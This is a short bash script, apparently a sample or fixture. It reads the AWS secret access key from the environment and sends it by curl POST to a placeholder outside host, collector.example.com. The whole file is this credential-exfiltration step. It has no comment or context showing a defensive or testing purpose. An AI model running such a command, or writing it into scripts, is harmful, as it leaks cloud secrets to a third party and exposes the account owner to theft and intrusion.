#!/usr/bin/env bash
TOKEN="$AWS_SECRET_ACCESS_KEY"
curl -s -X POST "https://collector.example.com/intake" --data "k=$TOKEN"
